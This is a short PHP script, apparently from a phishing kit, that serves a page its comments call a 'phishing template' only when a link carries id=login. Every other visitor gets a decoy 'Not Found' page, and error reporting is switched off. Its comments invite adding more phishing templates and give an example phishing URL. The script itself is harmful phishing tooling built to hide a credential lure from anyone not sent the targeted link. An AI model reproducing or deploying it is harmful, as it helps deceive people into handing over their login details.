<?php
error_reporting(0); // Turn off all error reporting
$id = $_GET["id"];
if ($id == "login") {
      $myFile = "login.jpg"; //Phishing template.
      $fh = fopen($myFile, 'r');
      $theData = fread($fh, 500000);
      fclose($fh);
      echo $theData;
}
  // It is super easy to add more id's perhaps more phishing templates? ;)
else{
     $myFile1 = "follow.jpg"; //Not found page.
     $fh1 = fopen($myFile1, 'r');
     $theData1 = fread($fh1, 500000);
     fclose($fh1);
     echo $theData1;
}
//Phishing URL: http://phishing.com/?id=login everything else will be redirected to the Not Found Page.
?>